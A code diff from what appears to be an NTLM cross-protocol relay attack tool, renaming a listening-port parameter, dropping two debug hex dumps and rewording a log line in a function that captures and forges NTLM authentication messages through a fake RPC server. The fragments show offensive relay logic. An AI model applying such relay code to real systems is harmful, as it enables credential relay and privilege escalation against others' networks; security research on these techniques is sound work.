@@ -17,7 +17,7 @@
 
 extern BOOL g_SuccessTrigger;
 
-void DoHTTPCrossProtocolRelay(wchar_t* remoteIpRelay, wchar_t* remotePortRelay, wchar_t* rpcServerIp, wchar_t* rpcServerPort, wchar_t* httpCrossProtocolRelayPort)
+void DoHTTPCrossProtocolRelay(wchar_t* remoteIpRelay, wchar_t* remotePortRelay, wchar_t* rpcServerIp, wchar_t* rpcServerPort, wchar_t* rpcRelayServerListeningPort)
 {
 	int iResult = 0;
 	int recvbuflen = DEFAULT_BUFLEN;
@@ -40,7 +40,7 @@ void DoHTTPCrossProtocolRelay(wchar_t* remoteIpRelay, wchar_t* remotePortRelay, 
 	char type1BakBuffer[DEFAULT_BUFLEN];
 	int type1BakLen = 0;
 
-	SOCKET RPCSocketListen = CreateRPCSocketListen(httpCrossProtocolRelayPort);
+	SOCKET RPCSocketListen = CreateRPCSocketListen(rpcRelayServerListeningPort);
 	SOCKET RPCSocketReflect = NULL;
 	SOCKET HTTPSocket = CreateHTTPSocket(remoteIpRelay, remotePortRelay);
 
@@ -78,14 +78,12 @@ void DoHTTPCrossProtocolRelay(wchar_t* remoteIpRelay, wchar_t* remotePortRelay, 
 				printf("[!] Couldn't communicate with the fake RPC Server\n");
 				break;
 			}
-			hexDump2((char*)"type1 received\n", type1BakBuffer, type1BakLen);
 			// receiving the type2 message from the fake RPC Server to use as a template for our relayed auth
 			iResult = recv(RPCSocketReflect, recvbuf, recvbuflen, 0);
 			if (iResult == SOCKET_ERROR) {
 				printf("[!] Couldn't receive the type2 message from the fake RPC Server\n");
 				break;
 			}
-			hexDump2((char*)"type2 forged by fake rpc server\n", recvbuf, iResult);
 			// get the ntlmindex from the type2 message received from the fake rpc server
 			ntlmIndex = findNTLMBytes(recvbuf, iResult);
 			// in this function we take the packet template from a real rpc server and we alter the authentication part, 
@@ -205,7 +203,7 @@ SOCKET CreateRPCSocketListen(const wchar_t* listenport) {
 		WSACleanup();
 		exit(-1);
 	}
-	printf("[+] Received the relayed authentication for iRemUnknown2 query on port %S\n", listenport);
+	printf("[+] Received the relayed authentication on the RPC relay server on port %S\n", listenport);
 	// No longer need server socket
 	closesocket(ListenSocket);
 	return ClientSocket;
